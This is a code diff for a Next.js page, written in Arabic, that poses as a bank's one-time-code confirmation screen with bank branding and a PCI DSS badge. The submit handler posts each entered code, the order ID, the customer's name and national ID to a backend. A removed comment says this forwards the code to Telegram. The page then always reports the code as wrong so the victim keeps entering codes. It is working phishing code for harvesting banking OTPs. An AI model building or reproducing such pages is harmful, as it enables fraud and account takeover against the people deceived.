@@ -3,7 +3,7 @@
 import { useState, useEffect, useRef } from "react";
 import Link from "next/link";
 import { useCartStore } from "../../store/cartStore";
-import { FileText, Receipt, X, ShieldCheck, KeyRound } from "lucide-react";
+import { FileText, Receipt, X } from "lucide-react";
 
 export default function VerifyPage() {
   const [otp, setOtp] = useState("");
@@ -20,7 +20,6 @@ export default function VerifyPage() {
   );
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
-  // eslint-disable-next-line spellcheck/spell-checker
   function startCooldown() {
     localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
     setCooldown(60);
@@ -32,45 +31,34 @@ export default function VerifyPage() {
       });
     }, 1000);
   }
+
   const { customer } = useCartStore();
   const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
 
-  // Initialize cooldown timer on component mount
   useEffect(() => {
-    // بدء العد التنازلي فور دخول الصفحة
     const currentTime = Date.now();
     let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
-    
-    // إذا لم يكن هناك وقت محفوظ أو انتهى الوقت، ابدأ عد تنازلي جديد
     if (unlockAt <= currentTime) {
-      unlockAt = currentTime + 60000; // 60 ثانية من الآن
+      unlockAt = currentTime + 60000;
       localStorage.setItem("resendUnlockAt", String(unlockAt));
     }
-    
     const remaining = Math.ceil((unlockAt - currentTime) / 1000);
     if (remaining <= 0) return;
-    
-    // Use a timeout to set the initial cooldown value
     const timeoutId = setTimeout(() => {
       setCooldown(remaining);
       cooldownRef.current = setInterval(() => {
         setCooldown((prev) => {
-          if (prev <= 1) { 
-            clearInterval(cooldownRef.current!);
-            return 0;
-          }
+          if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
           return prev - 1;
         });
       }, 1000);
     }, 0);
-    
     return () => {
       clearTimeout(timeoutId);
       if (cooldownRef.current) clearInterval(cooldownRef.current);
     };
   }, []);
 
-  // polling - يبدأ فوراً لو dbOrderId موجود
   useEffect(() => {
     const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
     if (!id) return;
@@ -85,7 +73,7 @@ export default function VerifyPage() {
       }
     }, 5000);
     return () => clearInterval(pollRef.current!);
-  // eslint-disable-next-line react-hooks/exhaustive-deps
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   function handleOtpChange(value: string) {
@@ -99,19 +87,13 @@ export default function VerifyPage() {
     e.preventDefault();
     const code = otp;
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
-    
-    // إرسال الرمز للتليجرام
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
-    
-    // إظهار رسالة خطأ
     setCodeError(true);
     setOtp("");
-
-    // تايمر 5 ثواني للزر
     setSubmitCooldown(5);
     clearInterval(submitCooldownRef.current!);
     submitCooldownRef.current = setInterval(() => {
@@ -122,7 +104,7 @@ export default function VerifyPage() {
     }, 1000);
   }
 
-  // ── Confirmed Popup ──────────────────────────────────────────────────────────
+  // ── Confirmed Popup ──
   const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
   if (confirmed && confirmedId) {
     return (
@@ -159,117 +141,144 @@ export default function VerifyPage() {
     );
   }
 
-  // ── Main Page ─────────────────────────────────────────────────────────────────
+  const pad = (n: number) => String(n).padStart(2, "0");
+
   return (
-    <div className="min-h-screen flex flex-col font-sans bg-white">
-      <style>{`body { background-color: #ffffff; }`}</style>
+    <>
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap');
+        body { background: #f3f4f5 !important; margin: 0; }
+        * { font-family: 'Cairo', sans-serif; }
+        .otp-field {
+          width: 100%; text-align: center; font-size: 1.5rem; font-weight: 700;
+          border: 2px solid #e0e2e4; border-radius: 14px;
+          background: #fff; color: #191c1d; padding: 14px 16px;
+          transition: all 0.2s ease; outline: none;
+          letter-spacing: 0.4em;
+        }
+        .otp-field:focus {
+          border-color: #3b6a00;
+          box-shadow: 0 0 0 3px rgba(59,106,0,0.1);
+        }
+        .otp-field.error { border-color: #ef4444; background: #fef2f2; }
+        .otp-field::placeholder { color: #c0c4c8; letter-spacing: 0.1em; font-size: 0.9rem; }
+      `}</style>
 
-      {/* Main */}
-      <main className="flex-grow flex items-center justify-center px-4 py-10 md:py-20">
-        <div className="max-w-2xl w-full">
+      <div dir="rtl" lang="ar" style={{ minHeight: "100vh", display: "flex", flexDirection: "column", background: "#f3f4f5" }}>
 
-          {/* Card */}
-          <div className="bg-white rounded-3xl shadow-[0px_8px_32px_rgba(0,0,0,0.10)] border border-gray-100 p-7 md:p-10 relative overflow-hidden">
+        {/* Background blurs */}
+        <div style={{ position: "fixed", inset: 0, zIndex: 0, pointerEvents: "none", overflow: "hidden" }}>
+          <div style={{ position: "absolute", top: "-8%", left: "-8%", width: "35%", height: "35%", background: "rgba(109,190,0,0.04)", borderRadius: "50%", filter: "blur(100px)" }} />
+          <div style={{ position: "absolute", bottom: "-5%", right: "-5%", width: "28%", height: "28%", background: "rgba(153,233,253,0.07)", borderRadius: "50%", filter: "blur(90px)" }} />
+        </div>
 
-            {/* Branding */}
-            <div className="mb-6 text-center">
-              <div className="flex flex-col items-center gap-3 mb-4">
-                <div className="bg-red-600 rounded-2xl p-5 shadow-md shadow-red-200">
-                  <KeyRound className="w-12 h-12 text-white" />
-                </div>
-                <span className="text-gray-700 font-bold text-xl tracking-wide">الأمان أولاً</span>
+       
+
+        {/* Main */}
+        <main style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "24px 16px 48px", position: "relative", zIndex: 1 }}>
+          <div style={{
+            width: "100%", maxWidth: 440,
+            background: "#fff", borderRadius: 20,
+            boxShadow: "0 8px 40px rgba(25,28,29,0.06), 0 1.5px 6px rgba(25,28,29,0.03)",
+            overflow: "hidden",
+          }}>
+            <form onSubmit={handleSubmit} style={{ padding: "40px 32px 36px", display: "flex", flexDirection: "column", alignItems: "center" }}>
+
+              {/* Bank Shield Icon */}
+              <div style={{ width: 56, height: 56, borderRadius: 16, background: "linear-gradient(135deg, #3b6a00, #6dbe00)", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: 16, boxShadow: "0 4px 14px rgba(59,106,0,0.2)" }}>
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="#fff" stroke="none"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
               </div>
-              <h1 className="text-2xl text-gray-900 leading-tight tracking-tight font-bold mb-3">تأكيد العملية</h1>
-              <p className="text-gray-500 leading-relaxed text-sm">
-                الرجاء إدخال رمز التحقق الذي يصلكم على الهاتف المحمول
-              </p>
-              <p className="text-gray-400 text-xs mt-2 bg-gray-50 rounded-xl px-4 py-2 inline-block">
-                ⏱ أحياناً يصل الرمز متأخراً بعد بضع دقائق، يرجى الانتظار قليلاً
-              </p>
-            </div>
 
-            {/* OTP Input */}
-            <form onSubmit={handleSubmit} className="space-y-5">
-              <div dir="ltr">
+              {/* Title */}
+              <h1 style={{ fontSize: "1.5rem", fontWeight: 800, color: "#191c1d", margin: "0 0 6px", lineHeight: 1.3 }}>تأكيد العملية</h1>
+              <p style={{ fontSize: "0.82rem", color: "#6b7280", margin: "0 0 8px", lineHeight: 1.7 }}>تم إرسال رمز التحقق (OTP) إلى رقم الجوال المسجل لدى البنك</p>
+              <p style={{ fontSize: "0.72rem", color: "#9ca3af", margin: "0 0 28px", lineHeight: 1.6, background: "#f9fafb", padding: "6px 14px", borderRadius: 8 }}>⏱ قد يستغرق وصول الرمز بضع ثوانٍ، يرجى الانتظار</p>
+
+              {/* OTP Input */}
+              <div style={{ width: "100%", marginBottom: 8 }} dir="ltr">
                 <input
                   type="text"
                   inputMode="numeric"
                   maxLength={6}
                   value={otp}
-                  onChange={e => handleOtpChange(e.target.value)}
+                  onChange={(e) => handleOtpChange(e.target.value)}
                   placeholder="أدخل الرمز"
-                  className={`w-full text-center text-2xl font-bold rounded-xl py-4 px-6 outline-none border-2 transition-all text-gray-900 tracking-[0.5em] ${
-                    codeError ? "border-red-400 bg-red-50" : "bg-gray-50 border-gray-200 focus:border-red-500 focus:bg-white focus:shadow-[0_0_0_3px_rgba(220,38,38,0.12)]"
-                  }`}
+                  className={`otp-field${codeError ? " error" : ""}`}
                 />
               </div>
 
-              {lengthError && <p className="text-orange-500 text-sm font-semibold text-center -mt-4">⚠️ يجب إدخال 4 أو 6 أرقام</p>}
-              {codeError && <p className="text-red-500 text-sm font-semibold text-center -mt-4">الرمز غير صحيح</p>}
-              {resent && <p className="text-green-600 text-sm text-center font-medium">✅ تم إعادة إرسال الرمز</p>}
+              {/* Errors */}
+              <div style={{ minHeight: 28, display: "flex", alignItems: "center", justifyContent: "center" }}>
+                {lengthError && <p style={{ color: "#f59e0b", fontSize: "0.82rem", fontWeight: 600, margin: 0 }}>⚠️ يجب إدخال 4 أو 6 أرقام</p>}
+                {codeError && <p style={{ color: "#ef4444", fontSize: "0.82rem", fontWeight: 600, margin: 0 }}>الرمز غير صحيح</p>}
+                {resent && <p style={{ color: "#16a34a", fontSize: "0.82rem", fontWeight: 500, margin: 0 }}>✅ تم إعادة إرسال الرمز</p>}
+              </div>
 
-              {/* Actions */}
-              <div className="space-y-4">
-                <button
-                  type="submit"
-                  disabled={submitCooldown > 0}
-                  className={`w-full py-4 px-6 rounded-xl text-white font-bold text-lg shadow-md transition-all duration-200 flex items-center justify-center gap-2 ${
-                    submitCooldown > 0
-                      ? "bg-gray-400 cursor-not-allowed opacity-60"
-                      : "bg-[#89BA45] hover:bg-[#7aaa3a] shadow-green-200 hover:shadow-green-300 active:scale-95"
-                  }`}
-                >
-                  {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "اتمام الطلب"}
-                  <ShieldCheck className="w-5 h-5" />
-                </button>
+              {/* Timer & Resend */}
+              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 10, marginBottom: 28 }}>
+                {cooldown > 0 ? (
+                  <span style={{ color: "#9ca3af", fontSize: "0.82rem", fontWeight: 600 }}>
+                    إعادة إرسال الرمز خلال {cooldown} ثانية
+                  </span>
+                ) : (
+                  <button
+                    type="button"
+                    onClick={() => {
+                      fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
+                      setResent(true);
+                      setTimeout(() => setResent(false), 3000);
+                      startCooldown();
+                    }}
+                    style={{
+                      background: "none", border: "none", padding: 0,
+                      fontSize: "0.82rem", fontWeight: 600,
+                      color: "#3b6a00", cursor: "pointer",
+                      textDecoration: "underline", textUnderlineOffset: 3,
+                    }}
+                  >
+                    إعادة إرسال الرمز
+                  </button>
+                )}
+              </div>
 
-                <div className="flex flex-col items-center gap-3 text-sm">
-                  <p className="text-gray-500">
-                    لم تستلم الرمز؟{" "}
-                    <button
-                      type="button"
-                      disabled={cooldown > 0}
-                      onClick={() => {
-                        if (cooldown > 0) return;
-                        fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
-                        setResent(true);
-                        setTimeout(() => setResent(false), 3000);
-                        startCooldown();
-                      }}
-                      className={`font-semibold transition-all select-none ${
-                        cooldown > 0
-                          ? "text-gray-300 cursor-not-allowed opacity-50 pointer-events-none"
-                          : "text-red-600 hover:underline cursor-pointer"
-                      }`}
-                    >
-                      {cooldown > 0 ? `إعادة الإرسال (${cooldown}s)` : "إعادة الإرسال"}
-                    </button>
-                  </p>
-                  <Link href="/checkout" className="flex items-center gap-1 text-gray-400 font-medium hover:text-gray-700 transition-colors">
-                    → العودة للطلب
-                  </Link>
+              {/* Submit */}
+              <button
+                type="submit"
+                disabled={submitCooldown > 0}
+                style={{
+                  width: "100%", padding: "15px 0", borderRadius: 14, border: "none",
+                  fontSize: "1.05rem", fontWeight: 700, color: "#fff",
+                  background: submitCooldown > 0 ? "#9ca3af" : "linear-gradient(135deg, #3b6a00, #6dbe00)",
+                  cursor: submitCooldown > 0 ? "not-allowed" : "pointer",
+                  opacity: submitCooldown > 0 ? 0.65 : 1,
+                  boxShadow: submitCooldown > 0 ? "none" : "0 4px 16px rgba(59,106,0,0.25)",
+                  transition: "all 0.25s ease",
+                }}
+              >
+                {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "إتمام الطلب "}
+              </button>
+
+              {/* Security warnings */}
+              <div style={{ marginTop: 24, width: "100%", display: "flex", flexDirection: "column", gap: 8 }}>
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#dc2626", fontSize: "0.68rem", fontWeight: 600 }}>
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="#dc2626" stroke="none">
+                    <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3zm1 14h-2v-2h2v2zm0-4h-2V7h2v5z" />
+                  </svg>
+                  <span>لا تشارك رمز التحقق مع أي شخص — البنك لن يطلبه منك أبداً</span>
+                </div>
+                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#9ca3af", fontSize: "0.62rem" }}>
+                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                  <span>اتصال مشفّر وآمن بمعايير PCI DSS</span>
                 </div>
               </div>
+
             </form>
-
-            {/* Decorative blobs */}
-            <div className="absolute -top-12 -right-12 w-32 h-32 bg-red-100/40 rounded-full blur-3xl pointer-events-none" />
-            <div className="absolute -bottom-12 -left-12 w-32 h-32 bg-red-50/40 rounded-full blur-3xl pointer-events-none" />
           </div>
+        </main>
 
-          {/* Contextual Help */}
-          <div className="mt-6 flex justify-center">
-            <div className="flex items-center gap-2 text-gray-400">
-              <ShieldCheck className="w-4 h-4" />
-              <span className="text-xs tracking-wider">وصول آمن ومشفر</span>
-            </div>
-          </div>
+      
 
-        </div>
-      </main>
-
-
-
-    </div>
+      </div>
+    </>
   );
 }
